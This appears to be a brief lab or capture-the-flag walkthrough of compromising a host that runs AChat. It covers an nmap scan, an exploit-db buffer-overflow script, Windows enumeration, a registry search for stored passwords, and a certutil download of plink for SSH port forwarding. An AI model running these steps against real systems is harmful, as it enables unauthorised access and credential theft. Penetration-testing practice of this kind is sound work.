# Password and Port Forwarding

At first we are going to gain a foothold so we are starting from nmap scan 

```
nmap -T4 -A -p- <target_ip>

// Using nmap scan we found target uses achat
searchsploit achat

// By the searchsploit we found there is a remote buffer overflow in the target and getting the code
cp /usr/share/exploitdb/exploits/windows/remote/36025.py 3.py 

// we gained low privilege escalation using the exploit and going to do enumeration for getting target weakness 
systeminfo
whoami
net users
net user alfred 
ipconfig
netstat -ano 
arp -a 

// finding passwords in the registry 
reg query HKLM /f password /t REG_5Z /s 
```

To make port forward we going to use the [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) and download the plink to the target system using the certutil 

By port forwarding of ssh we gained the access 

